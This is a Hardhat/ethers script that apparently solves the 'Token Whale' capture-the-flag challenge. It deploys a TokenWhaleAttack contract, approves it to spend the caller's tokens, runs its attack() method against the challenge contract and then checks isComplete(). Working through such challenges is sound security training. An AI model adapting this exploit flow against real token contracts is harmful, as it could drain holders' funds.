import { ethers } from "hardhat";

const myAddress = "0xD028d504316FEc029CFa36bdc3A8f053F6E5a6e4";
const challengeContractAddress = "0x75d12B56f62d0d02c8247C1083E855050F5F1E15";
const abi = [
  "function approve(address spender, uint256 value) external",
  "function isComplete() public view returns (bool)",
  "function balanceOf(address) external pure returns (uint256)",
];

async function main() {
  const mySigner = await ethers.getSigner(myAddress);
  const challengeContract = new ethers.Contract(
    challengeContractAddress,
    abi,
    mySigner
  );
  const initialBalance = await challengeContract.balanceOf(myAddress);
  console.log(`initialBalance: ${initialBalance}`);

  const AttackContractFactory = await ethers.getContractFactory(
    "TokenWhaleAttack"
  );
  const attackContract = await AttackContractFactory.deploy();
  await attackContract.deployed();
  console.log("TokenWhaleAttack deployed to:", attackContract.address);

  const approveTx = await challengeContract.approve(
    attackContract.address,
    "100000000000000000000"
  );
  await approveTx.wait();
  console.log(
    "The attackContract is approved to spend tokens on behalf of 'me'"
  );

  const attackTx = await attackContract.attack(
    challengeContract.address,
    initialBalance
  );
  await attackTx.wait();

  const success = await challengeContract.isComplete();
  console.log(`Attack success: ${success}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
